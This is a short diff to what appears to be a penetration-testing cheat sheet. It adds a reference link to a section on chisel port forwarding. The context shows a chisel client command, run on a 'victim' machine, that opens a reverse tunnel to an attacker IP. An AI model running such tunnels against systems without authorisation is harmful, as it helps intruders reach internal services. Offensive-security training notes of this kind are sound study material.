@@ -216,6 +216,8 @@ On Victim:
 Format = ./chisel client <AttackingIP>:<PortForServer> R:<KaliPort>:127.0.0.1:<VictimPort>
 ./chisel client 192.168.49.139:43022 R:43023:127.0.0.1:43022
 
+Reference:https://www.sevenlayers.com/index.php/332-chisel-port-forward
+
 ========
 Cracking
 ========
